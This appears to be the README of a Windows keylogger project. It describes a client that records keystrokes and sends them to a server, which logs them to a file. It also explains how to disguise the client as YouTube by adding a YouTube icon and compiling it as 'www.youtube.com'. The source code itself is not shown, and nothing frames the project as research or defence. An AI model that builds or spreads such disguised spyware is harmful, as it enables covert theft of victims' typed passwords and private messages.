# Windows keylogger

## Description

### client.c

This file does few things:

- open browser on specified link (here youtube)
- connect to server (if server not up then it will shut down)
- register keystrokes and send them to server

### server.c

Server must be started before `client.c`, otherwise `client.c` will not run. If it is started before it receives keystrokes and saves it to file (additionally it prints it out)

### additional files

Those were added to simulate opening YT.

`resources.rc` and `yt.ico` are additional files. After compiling them `client.c` will have icon from youtube

To add even better effect compile `client.c`:

`gcc.exe client.c -o www.youtube.com -l ws2_32`

## Note
